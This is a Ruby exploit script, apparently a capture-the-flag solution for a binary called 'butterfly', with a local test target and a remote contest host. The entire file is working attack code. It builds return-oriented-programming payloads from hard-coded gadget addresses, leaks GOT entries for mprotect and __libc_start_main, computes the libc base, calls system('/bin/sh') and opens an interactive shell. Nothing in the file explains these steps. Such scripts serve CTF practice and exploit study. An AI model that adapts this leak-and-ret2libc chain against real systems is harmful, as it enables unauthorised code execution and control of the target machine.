#!/usr/bin/ruby
#encoding:utf-8
require '~/HZC/Tools/pwnlib-master/pwnlib'

local = true
if local 
	host, port = '127.0.0.1', 4445
	mprotect_offset = 0xf0b60
	system_offset = 0x423f0
	sh_offset = 0x179541
else
	host, port = 'butterfly.pwning.xxx',9999
	mprotect_offset = 0x000f4a20
	sh_offset = 0x0017ccdb
	system_offset = 0x00046640
end
def sendata(payload)
	@r.recv_until("THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?")
	@r.send(payload)
	@r.recv_until("WAS IT WORTH IT???")
	puts "[!] send OK!"
end
PwnTube.open(host, port) do |r|
	@r = r
	mprotect_got = 0x600d00
	start_main_got = 0x600ce8
	puts_plt = 0x400600
	pop_ret = 0x00000000004008f2# : pop r15 ; ret
	pop_rdi_pop_ret = 0x0000000000400868 #: pop rdi ; pop rbp ; ret
	pop5_ret = 0x00000000004008eb# : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
	pop4_ret = 0x00000000004008ec# : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
	pop_rsi_pop_ret = 0x00000000004008f1# : pop rsi ; pop r15 ; ret
	pop3_ret = 0x0000000000400865 #: pop r14 ; pop r15 ; pop rbp ; ret
	pop2_ret = 0x0000000000400867# : pop r15 ; pop rbp ; ret
	pop_ret = 0x00000000004006f0 #: pop rbp ; ret
	start = 0x0400690# <_start>:

	sendata("33571584"+"a"*8+"b"*8+"t"*8+p64(0x400788)+"v"*8+"\n")
	sendata("50331648"+p64(puts_plt,pop_ret,0)+p64(0x400788,0x400788)+"a")
	sendata("50331648"+p64(pop_rdi_pop_ret,start_main_got,0)+p64(0x400788,pop4_ret)+"a")
	sendata("50331648"+p64(puts_plt,pop_ret,0)+p64(0x400788,pop4_ret)+"a")
	sendata("50331648"+p64(pop_rdi_pop_ret,mprotect_got,0)+p64(0x400788,pop4_ret)+"a")
	sendata("50331648"+"g"*8+"h"*8+"i"*8+p64(pop5_ret)+"j"*8+"a")

	@r.recv(1)
	leak_mprotect = @r.recv(6).ljust(8,"\0").unpack("Q")[0]
	@r.recv(1)
	leak_start_main = @r.recv(6).ljust(8,"\0").unpack("Q")[0]

	base = leak_mprotect - mprotect_offset
	system = base + system_offset
	sh = base + sh_offset

	puts "[!] libc base : 0x#{base.to_s(16)}"
	puts "[!] system : 0x#{system.to_s(16)}"
	puts "[!] sh : 0x#{sh.to_s(16)}"

	sendata("50331648"+p64(system,pop_ret,0)+p64(0x400788,pop4_ret)+"a")
	sendata("50331648"+p64(pop_rdi_pop_ret,sh,0)+p64(0x400788,pop4_ret)+"a")
	sendata("50331648"+"a"*8+"b"*8+"i"*8+p64(pop5_ret,0x65)+"a")
	@r.interactive
end
